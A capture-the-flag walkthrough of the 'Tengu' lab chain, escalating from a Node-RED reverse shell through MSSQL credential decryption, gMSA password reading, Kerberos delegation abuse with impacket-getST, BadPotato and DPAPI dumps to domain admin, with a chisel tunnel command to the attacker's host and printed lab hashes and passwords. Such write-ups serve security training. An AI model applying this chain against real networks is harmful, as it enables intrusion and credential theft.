# Tengu (chain) (meduim)

## port scan

```
Open 10.10.237.119:22
Open 10.10.237.119:1880
Open 10.10.237.118:3389
Open 10.10.237.117:3389
```

## service enumeration

![](<tengu(chain)(medium)/walkthrough_20240414132328967.png>)

## abuse node-red

we can select `exec` node and add into Flow 1

![](<tengu(chain)(medium)/walkthrough_20240414135415335.png>)

callback !

![](<tengu(chain)(medium)/walkthrough_20240414135406915.png>)

add reverse shell script

![](<tengu(chain)(medium)/walkthrough_20240414135548309.png>)

we have a shell

![](<tengu(chain)(medium)/walkthrough_20240414135556720.png>)

add ssh key

![](<tengu(chain)(medium)/walkthrough_20240414141117316.png>)

![](<tengu(chain)(medium)/walkthrough_20240414141400940.png>)

![](<tengu(chain)(medium)/walkthrough_20240414141442396.png>)

## decrypt mssql cred

i will upload chisel and nmap

![](<tengu(chain)(medium)/walkthrough_20240414142213049.png>)

![](<tengu(chain)(medium)/walkthrough_20240414142850002.png>)

```
./chisel client 10.8.1.167:8000 R:socks &
```

![](<tengu(chain)(medium)/walkthrough_20240414142335129.png>)

the 10.10.237.118 open 1433 (mssql), so the host maybe is `sql.tengu.vl` in node-red

![](<tengu(chain)(medium)/walkthrough_20240414142641673.png>)

the node-red must have mssql cred to finish the flow, so there must have cred. let's see

![](<tengu(chain)(medium)/walkthrough_20240414143944597.png>)

the readme.md tell use the cred stored at `env`

![](<tengu(chain)(medium)/walkthrough_20240414143956649.png>)

double click `SQL` nodes, we can use `Connection`, click edit

![](<tengu(chain)(medium)/walkthrough_20240414144546875.png>)

but we can't see the password

![](<tengu(chain)(medium)/walkthrough_20240414144654210.png>)

but there have a bash script to decrypt runtime cred

![](<tengu(chain)(medium)/walkthrough_20240414150012162.png>)

![](<tengu(chain)(medium)/walkthrough_20240414145652127.png>)

i will download cred json file

![](<tengu(chain)(medium)/walkthrough_20240414145714633.png>)

decrypt success! `nodered_connector:DreamPuppyOverall25`

![](<tengu(chain)(medium)/walkthrough_20240414145816518.png>)

now i can connect mssql server

![](<tengu(chain)(medium)/walkthrough_20240414145925616.png>)

## mssql enumeration

there have two custom db `Demo` and `Dev`

and the `Demo` db have `t2_m.winters` encrypt cred

![](<tengu(chain)(medium)/walkthrough_20240414150258637.png>)

check crackstation, the password is `Tengu123`

![](<tengu(chain)(medium)/walkthrough_20240414150500446.png>)

![](<tengu(chain)(medium)/walkthrough_20240414150557072.png>)

and we can use `Tengu123` become root

![](<tengu(chain)(medium)/walkthrough_20240414150631014.png>)

firefox ?

![](<tengu(chain)(medium)/walkthrough_20240414150805457.png>)

yes there installed firefox

![](<tengu(chain)(medium)/walkthrough_20240414150850008.png>)

## fetch domain information

internal smb enumeration

![](<tengu(chain)(medium)/walkthrough_20240414152055223.png>)

download `/etc/krb5.keytab` and get computer hash `NODERED$:d4210ee2db0c03aa3611c9ef8a4dbf49`

![](<tengu(chain)(medium)/walkthrough_20240414152436234.png>)

bloodhound fetch domain information

![](<tengu(chain)(medium)/walkthrough_20240414153023813.png>)

## read gmsa password

i will use a tool called `bloodhound-quickwin`

linux_server can read `GMSA01$` password

![](<tengu(chain)(medium)/walkthrough_20240414153413825.png>)

and GMSA01$ AllowedToDelegate => SQL.TENGU.VL, SQL_ADMINS group

![](<tengu(chain)(medium)/walkthrough_20240414153529273.png>)

![](<tengu(chain)(medium)/walkthrough_20240414154625423.png>)

since we have `nodered$` (linux_server) ntlm hash, we can abuse those relationship

use crackmapexec ldap to read GMSA01 gmsaPassword

`GMSA01$:bd1811a45423dcdd470df09ed1621b97`

![](<tengu(chain)(medium)/walkthrough_20240414154442826.png>)

## abuse KCD

since the GMSA01 AllowedToDelegate sql_admins group, we can impersonate a user from sql_admins group.

![](<tengu(chain)(medium)/walkthrough_20240414163739843.png>)

```
zds impacket-getST -spn 'MSSQLSvc/SQL.tengu.vl:1433' -dc-ip dc.tengu.vl -impersonate 'T1_C.FOWLER' -hashes :bd1811a45423dcdd470df09ed1621b97 'tengu.vl/gmsa01'
```

the error which mean the account was sensitive for delegation, or a member of the "Protected Users" group.

![](<tengu(chain)(medium)/walkthrough_20240414165418321.png>)

so let's try t2_m.winters user

```bash
zds impacket-getST -spn 'MSSQLSvc/sql.tengu.vl' -dc-ip dc.tengu.vl -impersonate 'T1_M.WINTERS' -hashes :bd1811a45423dcdd470df09ed1621b97 tengu.vl/gmsa01\$:@sql.tengu.vl
```

![](<tengu(chain)(medium)/walkthrough_20240414170607972.png>)

we have rce on sql server

![](<tengu(chain)(medium)/walkthrough_20240414170639211.png>)

get a beacon

![](<tengu(chain)(medium)/walkthrough_20240414170820529.png>)

![](<tengu(chain)(medium)/walkthrough_20240414170834174.png>)

## abuse SeImpersonatePrivilege

since we are service account, we also have `SeImpersonatePrivilege` privilege.

![](<tengu(chain)(medium)/walkthrough_20240414170922984.png>)

we can use BadPotato tool get system beacon
https://github.com/BeichenDream/BadPotato

![](<tengu(chain)(medium)/walkthrough_20240414171211842.png>)

## domain admin

sam dump

![](<tengu(chain)(medium)/walkthrough_20240414171623775.png>)

sharpdpapi machinetriage

![](<tengu(chain)(medium)/walkthrough_20240414172924561.png>)

there have T0_c.fowler cred

![](<tengu(chain)(medium)/walkthrough_20240414173021844.png>)

domain admin ?

![](<tengu(chain)(medium)/walkthrough_20240414173107510.png>)

STATUS_ACCOUNT_RESTRICTION - Local Security Policy/Accounts: Limit local account use of blank passwords to computer.

![](<tengu(chain)(medium)/walkthrough_20240414173405383.png>)

we can try kerberos auth

krb5.conf

```
[libdefaults]
        default_realm = TENGU.VL
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        rdns = false
        dns_canonicalize_hostname = false
        fcc-mit-ticketflags = true

[realms]
        TENGU.VL = {
                kdc = dc.tengu.vl
        }

[domain_realm]
        .tengu.vl = TENGU.VL
```

ok!

![](<tengu(chain)(medium)/walkthrough_20240414173628798.png>)

now we have domain admin shell on dc!

![](<tengu(chain)(medium)/walkthrough_20240414173729485.png>)
